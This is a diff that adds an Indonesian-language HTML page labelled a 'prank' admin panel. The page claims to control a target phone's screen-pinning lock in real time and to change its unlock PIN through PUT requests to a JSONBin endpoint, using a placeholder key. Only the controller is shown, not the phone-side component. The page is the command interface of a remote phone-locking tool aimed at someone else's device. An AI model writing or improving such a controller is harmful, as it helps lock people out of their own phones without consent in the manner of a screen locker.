@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Remote Control Prank</title>
+    <style>
+        body { font-family: sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; }
+        .card { background: #1e293b; padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; }
+        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn-danger { background: #ef4444; color: white; }
+        .btn-success { background: #22c55e; color: white; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 6px; border: 1px solid #475569; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Panel Kontrol Admin</h2>
+        <p>Kontrol HP Target secara Real-Time</p>
+        <hr style="border-color: #334155;">
+
+        <h3>1. Status Mode Semat</h3>
+        <button class="btn-danger" onclick="updateServer(false)">[ MATIKAN SEMATAN DARI JAUH ]</button>
+        <button class="btn-success" onclick="updateServer(true)">[ AKTIFKAN KEMBALI ]</button>
+
+        <hr style="border-color: #334155;">
+
+        <h3>2. Ubah PIN Pembuka Jarak Jauh</h3>
+        <input type="text" id="newPin" placeholder="Masukkan PIN Baru (misal: 9999)">
+        <button class="btn-success" onclick="changePin()">Ganti PIN Target</button>
+    </div>
+
+    <script>
+        // Ganti URL dengan URL endpoint REST API Server kamu (misal JSONBin.io)
+        const API_URL = "https://api.jsonbin.io/v3/b/65f000000000000000000000";
+        const API_KEY = "$2a$10$YOUR_JSONBIN_MASTER_KEY"; // Key gratis dari jsonbin.io
+
+        function updateServer(status) {
+            fetch(API_URL, {
+                method: "PUT",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Master-Key": API_KEY
+                },
+                body: JSON.stringify({ status_semat: status, pin_rahasia: document.getElementById('newPin').value || "1234" })
+            })
+            .then(res => res.json())
+            .then(data => alert("Status berhasil diupdate! HP Target akan merespons dalam 3 detik."))
+            .catch(err => alert("Gagal konek ke server."));
+        }
+
+        function changePin() {
+            let pinBaru = document.getElementById('newPin').value;
+            if(!pinBaru) return alert("Isi PIN dulu, bro!");
+            updateServer(true);
+        }
+    </script>
+</body>
+</html>
